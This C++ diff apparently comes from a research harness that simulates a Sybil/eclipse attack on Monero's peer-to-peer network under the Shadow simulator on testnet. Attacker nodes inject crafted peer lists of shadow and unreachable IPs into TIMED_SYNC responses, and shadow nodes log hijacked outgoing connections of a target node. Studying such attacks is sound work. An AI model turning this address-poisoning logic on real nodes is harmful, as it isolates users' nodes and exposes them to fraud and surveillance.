@@ -18,6 +18,62 @@
 using namespace sybiltest;
 using namespace std;
 
+// to deal with peerlist
+static nodetool::peerlist_entry create_peerlist_entry(std::string _ip_str, int _port) {
+//    nodetool::peerlist_entry ple;
+
+    std::uint32_t ip = inet_addr(_ip_str.c_str());
+    if(INADDR_NONE == ip)
+    {
+        std::cout << "inet_addr failed" << "\n";
+        exit(-1);
+    }
+    epee::net_utils::ipv4_network_address ipv4_netaddr{ip, (uint16_t) _port};
+
+    epee::net_utils::network_address na{ipv4_netaddr};
+    nodetool::peerlist_entry ple{na};
+    ple.last_seen = 0;
+    return ple;
+}
+
+template<class t_in_type>
+static boost::value_initialized<t_in_type> parse_rawstream_into_struct(const epee::span<const uint8_t> in_buff) {
+    epee::serialization::portable_storage strg;
+    if (!strg.load_from_binary(in_buff)) {
+        std::cout << "Failed to load_from_binary" << "\n";
+        exit(-1);
+    }
+    boost::value_initialized<t_in_type> in_struct;
+    if (!static_cast<t_in_type &>(in_struct).load(strg)) {
+        std::cout << "Failed to load in_struct " << "\n";
+        exit(-1);
+    }
+
+    return in_struct;
+}
+
+template<class t_out_type>
+static std::string
+get_msgstr_from_struct(t_out_type &rsp, int command, uint32_t flags, bool response_required = false) {
+    std::string return_buff;
+
+    epee::serialization::portable_storage strg_out;
+    rsp.store(strg_out);
+
+    if (!strg_out.store_to_binary(return_buff)) {
+        std::cout << "Failed to store_to_binary" << "\n";
+        exit(-1);
+    }
+
+    epee::levin::bucket_head2 head = epee::levin::make_header(command, return_buff.size(),
+                                                              flags, response_required);
+    if (flags == LEVIN_PACKET_RESPONSE)
+        head.m_return_code = SWAP32LE(1); // return value of invoke function for this command
+    return_buff.insert(0, reinterpret_cast<const char *>(&head), sizeof(head));
+
+    return return_buff;
+}
+
 void MoneroNodePrimitives::OpAfterConnect(int conn_fd) {
     cout << "OpAfterConnect for node [" << GetIP() << "]" << "\n";
     switch (_type) {
@@ -40,34 +96,10 @@ void MoneroNodePrimitives::OpAfterConnect(int conn_fd) {
             arg.payload_data.cumulative_difficulty_top64 = 0;
             arg.payload_data.pruning_seed = 0;
 
-            typename epee::serialization::portable_storage stg;
-            const_cast<t_req &>(arg).store(stg);
-            std::string buff_to_send;
-            stg.store_to_binary(buff_to_send);
-
             uint32_t command = nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::ID;
-            bool flag = LEVIN_PACKET_REQUEST;
-            bool expect_response = true;
-            const epee::levin::bucket_head2 head = epee::levin::make_header(command, buff_to_send.size(), flag,
-                                                                            expect_response);
+            std::string buff_to_send = get_msgstr_from_struct<t_req>(arg, command, LEVIN_PACKET_REQUEST, true);
 
-            epee::byte_slice bytes{epee::as_byte_span(head), epee::strspan<uint8_t>(buff_to_send)};
-
-            struct msghdr msg;
-            struct iovec iov;
-
-            iov.iov_base = (void *) bytes.data();
-            iov.iov_len = bytes.size();
-
-            msg.msg_name = NULL;
-            msg.msg_namelen = 0;
-            msg.msg_iov = &iov;
-            msg.msg_iovlen = 1;
-            msg.msg_control = NULL;
-            msg.msg_controllen = 0;
-
-            // int sendmsg_flag = MSG_NOSIGNAL; // ignore flag (shadow does not support it
-            SendMsg(conn_fd, &msg);
+            SendMsgUsingMsgHdr(conn_fd, buff_to_send);
 
 
 //            boost::program_options::variables_map vm;
@@ -86,6 +118,19 @@ void MoneroNodePrimitives::OpAfterConnect(int conn_fd) {
 
 void MoneroNodePrimitives::OpAfterConnected(int data_fd) {
     // do nothing
+    if (_type == NodeType::Benign) {
+        _attackStat->benignNodeConnNum++;
+    }
+    else if (_type == NodeType::Shadow) {
+        _attackStat->shadowNodeConnNum++;
+    }
+    std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+    auto tm = *std::localtime(&now);
+    std::ostringstream oss;
+    oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
+    std::string timestr = oss.str();
+    std::cout << timestr << ",Node (socket) connected : " << GetIP() << ", benignNodeConnNum=" << _attackStat->benignNodeConnNum
+              << ", shadowNodeConnNum=" << _attackStat->shadowNodeConnNum << "\n";
 }
 
 void MoneroNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
@@ -146,23 +191,35 @@ void MoneroNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
                         typedef nodetool::COMMAND_TIMED_SYNC_T<cryptonote::CORE_SYNC_DATA> COMMAND_TIMED_SYNC;
                         typedef COMMAND_TIMED_SYNC::request t_req;
                         typedef COMMAND_TIMED_SYNC::response t_resp;
-                        epee::serialization::portable_storage strg;
-                        if (!strg.load_from_binary(buff_to_invoke)) {
-                            std::cout << "Failed to load_from_binary in command " << command << "\n";
-                            exit(-1);
+                        cout << "Received COMMAND_TIMED_SYNC_T message"
+                             << ", NodeIP:" << GetIP() << "\n";
+
+                        if (_type == NodeType::Shadow && !_informed) {
+
+                            // print attack success message
+                            cout
+                                    << "Interception of target node's outgoing connection is confirmed"
+                                    << ", Shadow NodeIP:" << GetIP() << "\n";
+                            // update attack statistics
+                            _attackStat->IncrementHijackedOutgoingConnNum();
+                            _informed = true;
+
+                            std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+                            auto tm = *std::localtime(&now);
+                            std::ostringstream oss;
+                            oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
+                            std::string timestr = oss.str();
+                            std::cout << timestr << ",outgoing connection hijacked : " << GetIP()
+                                      << ", hijackedOutgoingNum=" << _attackStat->GetHijackedOutgoingConnNum() << "\n";
                         }
-                        boost::value_initialized<t_req> in_struct;
-                        boost::value_initialized<t_resp> out_struct;
-                        if (!static_cast<t_req &>(in_struct).load(strg)) {
-                            std::cout << "Failed to load in_struct in command " << command << "\n";
-                            exit(-1);
-                        }
+
+                        boost::value_initialized<t_req> in_struct = parse_rawstream_into_struct<t_req>(buff_to_invoke);
 
                         // fill response
                         // std::vector<nodetool::peerlist_entry> local_peerlist_new;
                         // local_peerlist_new.reserve(1);
                         // static_cast<t_resp &>(out_struct).local_peerlist_new.
-                        t_resp &rsp = static_cast<t_resp &>(out_struct);
+                        t_resp rsp;
                         rsp.payload_data.current_height = 1;
                         rsp.payload_data.top_id = {72, -54, 124, -45, -56, -34, 91, 106, 77, 83, -46, -122, 31, -67,
                                                    -82, -36, -95,
@@ -171,90 +228,64 @@ void MoneroNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
                         rsp.payload_data.cumulative_difficulty_top64 = 0;
                         rsp.payload_data.pruning_seed = 0;
 
-                        epee::serialization::portable_storage strg_out;
-                        rsp.store(strg_out);
-                        // fill response end
-
-                        if (!strg_out.store_to_binary(return_buff)) {
-                            std::cout << "Failed to store_to_binary in command " << command << "\n";
-                            exit(-1);
+                        if (_type == NodeType::Attacker) {
+                            if (_addr_ip_list.size() > 0) {
+                                for (auto &ple : _addr_ip_list)
+                                    rsp.local_peerlist_new.push_back(ple);
+                                _addr_ip_list.clear();
+                            }
                         }
 
-                        epee::levin::bucket_head2 head = epee::levin::make_header(command, return_buff.size(),
-                                                                                  LEVIN_PACKET_RESPONSE, false);
-                        head.m_return_code = SWAP32LE(1); // return value of invoke function for this command
-                        return_buff.insert(0, reinterpret_cast<const char *>(&head), sizeof(head));
+                        return_buff = get_msgstr_from_struct(rsp, P2P_COMMANDS_POOL_BASE + 2, LEVIN_PACKET_RESPONSE);
 
-                        epee::byte_slice bytes{std::move(return_buff)};
-                        // message_data : "\001!\001\001\001\001\001\001\035"
-                        // message_size : 62
-
-                        struct msghdr msg;
-                        struct iovec iov;
-
-                        iov.iov_base = (void *) bytes.data();
-                        iov.iov_len = bytes.size();
-
-                        msg.msg_name = NULL;
-                        msg.msg_namelen = 0;
-                        msg.msg_iov = &iov;
-                        msg.msg_iovlen = 1;
-                        msg.msg_control = NULL;
-                        msg.msg_controllen = 0;
-
-                        // int sendmsg_flag = MSG_NOSIGNAL; // ignore flag (shadow does not support it)
-                        SendMsg(data_fd, &msg);
+                        SendMsgUsingMsgHdr(data_fd, return_buff);
                         break;
                     }
                     case P2P_COMMANDS_POOL_BASE + 7 : {
                         typedef nodetool::COMMAND_REQUEST_SUPPORT_FLAGS::request t_req;
                         typedef nodetool::COMMAND_REQUEST_SUPPORT_FLAGS::response t_resp;
-                        epee::serialization::portable_storage strg;
-                        if (!strg.load_from_binary(buff_to_invoke)) {
-                            std::cout << "Failed to load_from_binary in command " << command << "\n";
-                            exit(-1);
-                        }
-                        boost::value_initialized<t_req> in_struct;
-                        boost::value_initialized<t_resp> out_struct;
-                        if (!static_cast<t_req &>(in_struct).load(strg)) {
-                            std::cout << "Failed to load in_struct in command " << command << "\n";
-                            exit(-1);
-                        }
+
+                        boost::value_initialized<t_req> in_struct = parse_rawstream_into_struct<t_req>(buff_to_invoke);
+
+                        t_resp rsp;
                         // in function handle_get_support_flags, set rsp.support_flags as 1
                         // I don't know the meaning of value 1
-                        static_cast<t_resp &>(out_struct).support_flags = 1;
+                        rsp.support_flags = 1;
 
-                        epee::serialization::portable_storage strg_out;
-                        static_cast<t_resp &>(out_struct).store(strg_out);
-                        if (!strg_out.store_to_binary(return_buff)) {
-                            std::cout << "Failed to store_to_binary in command " << command << "\n";
-                            exit(-1);
+                        return_buff = get_msgstr_from_struct(rsp, P2P_COMMANDS_POOL_BASE + 7, LEVIN_PACKET_RESPONSE);
+
+                        SendMsgUsingMsgHdr(data_fd, return_buff);
+                        break;
+                    }
+                    case P2P_COMMANDS_POOL_BASE + 1: {
+                        if (_type == NodeType::Shadow || _type == NodeType::Benign) {
+                            typedef nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::request t_req;
+                            typedef nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::response t_resp;
+
+                            boost::value_initialized<t_req> in_struct = parse_rawstream_into_struct<t_req>(
+                                    buff_to_invoke);
+
+                            t_resp rsp;
+                            rsp.node_data.peer_id = crypto::rand<uint64_t>();
+                            rsp.node_data.my_port = 28080;
+                            rsp.node_data.rpc_port = 0;
+                            rsp.node_data.rpc_credits_per_hash = 0;
+                            memcpy(&rsp.node_data.network_id, &::config::testnet::NETWORK_ID, 16);
+
+                            rsp.payload_data.top_version = 1;
+                            rsp.payload_data.top_id = {72, -54, 124, -45, -56, -34, 91, 106, 77, 83, -46, -122, 31, -67,
+                                                       -82, -36, -95,
+                                                       65, 85, 53, 89, -7, -66, -107, 32, 6, -128, 83, -51, -88, 67,
+                                                       11};
+                            rsp.payload_data.current_height = 1;
+                            rsp.payload_data.cumulative_difficulty = 1;
+                            rsp.payload_data.cumulative_difficulty_top64 = 0;
+                            rsp.payload_data.pruning_seed = 0;
+
+                            std::string response = get_msgstr_from_struct<t_resp>(rsp, P2P_COMMANDS_POOL_BASE + 1,
+                                                                                  LEVIN_PACKET_RESPONSE);
+                            SendMsgUsingMsgHdr(data_fd, response);
                         }
-
-                        epee::levin::bucket_head2 head = epee::levin::make_header(command, return_buff.size(),
-                                                                                  LEVIN_PACKET_RESPONSE, false);
-                        head.m_return_code = SWAP32LE(1); // return value of invoke function for this command
-                        return_buff.insert(0, reinterpret_cast<const char *>(&head), sizeof(head));
-
-                        epee::byte_slice bytes{std::move(return_buff)};
-                        // message_data : "\001!\001\001\001\001\001\001\035"
-                        // message_size : 62
-
-                        struct msghdr msg;
-                        struct iovec iov;
-
-                        iov.iov_base = (void *) bytes.data();
-                        iov.iov_len = bytes.size();
-
-                        msg.msg_name = NULL;
-                        msg.msg_namelen = 0;
-                        msg.msg_iov = &iov;
-                        msg.msg_iovlen = 1;
-                        msg.msg_control = NULL;
-                        msg.msg_controllen = 0;
-
-                        // int sendmsg_flag = MSG_NOSIGNAL; // ignore flag (shadow does not support it)
-                        SendMsg(data_fd, &msg);
                         break;
                     }
 //                    case nodetool::COMMAND_HANDSHAKE_T<cryptonote::CORE_SYNC_DATA>::ID:
@@ -328,7 +359,34 @@ void MoneroNodePrimitives::OpAfterRecv(int data_fd, string recv_str) {
 }
 
 void MoneroNodePrimitives::OpAfterDisconnect() {
-    // do nothing
+    if (_type == NodeType::Shadow && _informed) {
+        // update attack statistics
+        _attackStat->DecrementHijackedOutgoingConnNum();
+        _informed = false;
+
+        std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+        auto tm = *std::localtime(&now);
+        std::ostringstream oss;
+        oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
+        std::string timestr = oss.str();
+        std::cout << timestr << ",outgoing connection hijacked disconnected : " << GetIP()
+                  << ", hijackedOutgoingNum=" << _attackStat->GetHijackedOutgoingConnNum() << "\n";
+    }
+
+    if (_type == NodeType::Benign) {
+        _attackStat->benignNodeConnNum--;
+    }
+    else if (_type == NodeType::Shadow) {
+        _attackStat->shadowNodeConnNum--;
+    }
+    std::time_t now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+    auto tm = *std::localtime(&now);
+    std::ostringstream oss;
+    oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
+    std::string timestr = oss.str();
+
+    std::cout << timestr << ",Node (socket) disconnected : " << GetIP() << ", benignNodeConnNum=" << _attackStat->benignNodeConnNum
+              << ", shadowNodeConnNum=" << _attackStat->shadowNodeConnNum << "\n";
 }
 
 void MoneroNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::duration preparePhaseDuration,
@@ -348,6 +406,14 @@ void MoneroNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::dur
         int legiIPcount = totalIPCount * 0.3;
         int unreLegiIPcount = totalIPCount * 0.7;
 
+        legiIPcount = min(legiIPcount, (int) vReachableIP.size());
+        unreLegiIPcount = min(unreLegiIPcount, (int) vUnreachIP.size());
+        if (!vReachableIP.empty())
+            sample(vReachableIP.begin(), vReachableIP.end(), back_inserter(vAddr), legiIPcount,
+                   mt19937{random_device{}()});
+        if (!vUnreachIP.empty())
+            sample(vUnreachIP.begin(), vUnreachIP.end(), back_inserter(vAddr), unreLegiIPcount,
+                   mt19937{random_device{}()});
     } else {
         // if it's attack phase
         int totalIPCount = std::min(1000, (int) (periodLength * ipPerSec));
@@ -355,12 +421,32 @@ void MoneroNodePrimitives::OpAddrInjectionTimeout(std::chrono::system_clock::dur
         int unreLegiIPcount = totalIPCount * (1 - shadowRate) * 0.7;
         int shadowIPcount = totalIPCount * shadowRate;
 
+        legiIPcount = min(legiIPcount, (int) vReachableIP.size());
+        unreLegiIPcount = min(unreLegiIPcount, (int) vUnreachIP.size());
+        shadowIPcount = min(shadowIPcount, (int) vShadowIP.size());
+
+        if (!vReachableIP.empty())
+            std::sample(vReachableIP.begin(), vReachableIP.end(), std::back_inserter(vAddr), legiIPcount,
+                        std::mt19937{std::random_device{}()});
+        if (!vUnreachIP.empty())
+            std::sample(vUnreachIP.begin(), vUnreachIP.end(), std::back_inserter(vAddr), unreLegiIPcount,
+                        std::mt19937{std::random_device{}()});
+        if (!vShadowIP.empty())
+            std::sample(vShadowIP.begin(), vShadowIP.end(), std::back_inserter(vAddr), shadowIPcount,
+                        std::mt19937{std::random_device{}()});
+        std::cout << "debug print start (attack phase)" << "\n";
+        std::cout << "legiIPcount:" << legiIPcount << ", unreachable legiIPCount:" << unreLegiIPcount
+                  << ", shadowIPcount:" << shadowIPcount << "\n";
     }
 
     // assume a single data socket
     assert(_mTCPControl.size() == 1);
     int data_fd = _mTCPControl.begin()->first;
 
-    // Create a ADDR message for `vIP`,
-    // then push it to message queue
+    // append to addr peerlist
+    _addr_ip_list.clear();
+    for (std::string ip : vAddr) {
+        nodetool::peerlist_entry ple = create_peerlist_entry(ip, 28080);
+        _addr_ip_list.push_back(ple);
+    }
 }
